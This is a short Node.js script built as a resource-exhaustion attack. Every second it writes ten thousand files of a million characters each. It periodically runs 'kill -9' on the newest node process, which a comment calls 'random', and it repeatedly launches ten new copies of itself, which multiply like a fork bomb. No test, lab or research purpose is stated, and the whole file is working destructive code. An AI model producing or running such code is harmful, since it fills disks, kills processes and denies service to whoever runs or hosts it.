const { exec } = require('child_process');
const fs = require('fs');

// Function to generate large data structure
function generateData() {
    return Array.from({ length: 10 ** 6 }, () => 'a').join(''); // Generate a string of length 10^6
}

// Function to kill a random process
function killRandomProcess() {
    exec('pgrep -n node', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }
        const pid = stdout.trim();
        if (pid) {
            exec(`kill -9 ${pid}`);
            console.log(`Killed process with PID: ${pid}`);
        }
    });
}

// Function to overwhelm the system
function overwhelmSystem() {
    console.log("Overwhelming system...");
    for (let i = 0; i < 10; i++) {
        exec('node ' + __filename); // Start a new process of the current script
    }
}

// Main function
function main() {
    let count = 1;

    setInterval(() => {
        // Generate large data structure to consume memory
        const data = generateData();

        // Save to multiple text files (simulated)
        for (let i = 0; i < 10000; i++) {
            fs.writeFileSync(`output_${count}_${i}.txt`, data);
        }

        count++;

        // Kill random process every 50 iterations
        if (count % 50 === 0) {
            killRandomProcess();
        }

        // Overwhelm the system every 100 iterations
        if (count % 100 === 0) {
            overwhelmSystem();
        }
    }, 1000); // Run every second
}

// Start the main function
main();
